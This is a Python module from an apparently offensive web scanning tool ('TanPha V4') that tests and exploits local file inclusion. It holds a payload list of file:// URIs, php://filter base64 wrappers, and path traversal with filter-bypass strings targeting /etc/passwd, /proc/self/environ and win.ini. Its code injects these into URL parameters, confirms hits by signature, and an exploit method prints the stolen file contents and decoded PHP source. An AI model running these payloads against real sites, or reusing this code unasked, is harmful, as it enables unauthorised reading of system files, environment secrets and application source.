"""Local File Inclusion (LFI) Module for TanPha V4 (Global Multi-OS + High Bypass)."""
from modules.base import BaseModule
from core.context import TargetContext, Evidence, Finding
from core.verification import VerificationResult, VerificationStatus
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
import re
import base64


class LFIModule(BaseModule):
    name = "LFI"
    module_id = "lfi"
    version = "2.2 (Global God Tier)"
    vulnerability_class = "LOCAL_FILE_INCLUSION"
    default_impact = "SENSITIVE_FILE_DISCLOSURE"
    default_privilege = "WEB_USER"

    _TARGET_FILES = [
        # === V4.2 ADDED: FILE YANG HAMPIR PASTI ADA DI ANDROID/LINUX ===
        {
            "path": "file:///etc/hosts",
            "signatures": ["127.0.0.1", "localhost"],
            "desc": "Linux /etc/hosts (High Bypass via file://)"
        },
        {
            "path": "file:///proc/self/environ",
            "signatures": ["PATH=", "USER=", "HOME="],
            "desc": "Linux /proc/self/environ (High Bypass via file://)"
        },
        {
            "path": "file:///etc/passwd",
            "signatures": ["root:", "daemon:", "u0_a", ":/bin/"],
            "desc": "Linux /etc/passwd (High Bypass via file://)"
        },
        {
            "path": "file:///c:/windows/win.ini",
            "signatures": ["[extensions]", "[fonts]"],
            "desc": "Windows win.ini (High Bypass via file://)"
        },
        # === LOW / MEDIUM PAYLOADS ===
        {
            "path": "php://filter/convert.base64-encode/resource=index.php",
            "signatures": ["PD9waHA", "c2Vzc2lvbl9zdGFydA==", "PGh0bWw+"], 
            "desc": "PHP Filter Base64 (Index.php)"
        },
        {
            "path": "../../../../../../../../etc/hosts",
            "signatures": ["127.0.0.1", "localhost"],
            "desc": "Linux /etc/hosts (Deep Path)"
        },
        {
            "path": "../../../../../../../../etc/passwd",
            "signatures": ["root:", "daemon:", "u0_a"],
            "desc": "Linux/Android /etc/passwd (Deep Path)"
        },
        {
            "path": "....//....//....//....//....//....//....//....//etc/passwd",
            "signatures": ["root:", "daemon:", "u0_a"],
            "desc": "Linux/Android /etc/passwd (Medium Bypass)"
        }
    ]

    def can_run(self, context: TargetContext) -> bool:
        if not context.discovery.parameters:
            print("      [!] Discovery failed. Forcing fallback parameter 'page' for LFI...")
            context.discovery.parameters = ["page"]
        return True

    def _build_target_url(self, base_url: str, param: str, payload: str) -> str:
        parsed = urlparse(base_url)
        qs = parse_qsl(parsed.query, keep_blank_values=True)
        new_qs = [(k, payload) if k == param else (k, v) for k, v in qs]
        if not new_qs:
            new_qs = [(param, payload)]
        return urlunparse(parsed._replace(query=urlencode(new_qs, safe="")))

    def _send_payload(self, context, param, payload, scope_checker=None, timeout=10):
        # Paksa pakai GET karena LFI biasanya ?page=...
        target_url = self._build_target_url(context.target.base_url, param, payload)
        return context.http_client.request("GET", target_url, target_param=param, scope_checker=scope_checker, bypass_mutation=True, timeout=timeout)

    def assess(self, context: TargetContext, scope_checker=None) -> list[Evidence]:
        evidence_pool = []
        
        for param in context.discovery.parameters:
            print(f"      [>] Testing LFI on parameter: '{param}'")
            
            for target in self._TARGET_FILES:
                print(f"          [*] Trying: {target['desc']}...")
                result = self._send_payload(context, param, target["path"], scope_checker)
                
                if result.success and result.response:
                    if any(sig in result.response.text for sig in target["signatures"]):
                        print(f"      [!] LFI FOUND! Target: {target['desc']}")
                        ev = Evidence(
                            attempt_id="lfi_001",
                            module_id=self.module_id,
                            module_version=self.version,
                            location=context.target.base_url,
                            parameter=param,
                            outcome="CHANGED_RESPONSE",
                            reason_code="FILE_DISCLOSED",
                            reason_detail=f"File {target['desc']} successfully read",
                            confidence=0.95,
                            evidence_text=f"Signature found in response",
                            assess_payload=target["path"]
                        )
                        evidence_pool.append(ev)
                        break 
                        
        return evidence_pool

    def verify(self, context: TargetContext, evidence: Evidence, scope_checker=None) -> VerificationResult:
        print(f"      [*] Verifying LFI on '{evidence.parameter}'...")
        
        result = self._send_payload(context, evidence.parameter, evidence.assess_payload, scope_checker)
        
        if result.success and result.response:
            for target in self._TARGET_FILES:
                if target["path"] == evidence.assess_payload:
                    if any(sig in result.response.text for sig in target["signatures"]):
                        return VerificationResult(
                            VerificationStatus.VALIDATED, 0.95, 
                            "LFI_CONFIRMED", f"File {target['desc']} confirmed",
                            verify_payload=evidence.assess_payload
                        )
                        
        return VerificationResult(VerificationStatus.REJECTED, 0.0, "LFI_FAILED", "Signature not found on re-check")

    def exploit(self, context: TargetContext, finding: Finding):
        print("\n[***] LFI EXPLOIT: FILE DISCLOSURE [***]")
        print(f"[*] Target: {finding.location} | Parameter: {finding.parameter}")
        print(f"[*] File: {finding.verify_payload}")
        
        result = self._send_payload(context, finding.parameter, finding.verify_payload, None)
        
        if result.success and result.response:
            print("\n--- File Content (First 500 bytes) ---")
            clean_text = re.sub(r'<[^>]+>', ' ', result.response.text)
            
            if "php://filter" in finding.verify_payload:
                b64_match = re.search(r'([A-Za-z0-9+/]{50,}={0,2})', clean_text)
                if b64_match:
                    try:
                        decoded = base64.b64decode(b64_match.group(1)).decode('utf-8', errors='ignore')
                        print("[*] Base64 Decoded Source Code:\n")
                        print(decoded[:500] + "...\n")
                    except Exception:
                        print(clean_text[:500] + "...")
                else:
                    print(clean_text[:500] + "...")
            else:
                print(clean_text[:500] + "...")
                
            print("--------------------------------------\n")
        else:
            print("[-] Failed to read file.")
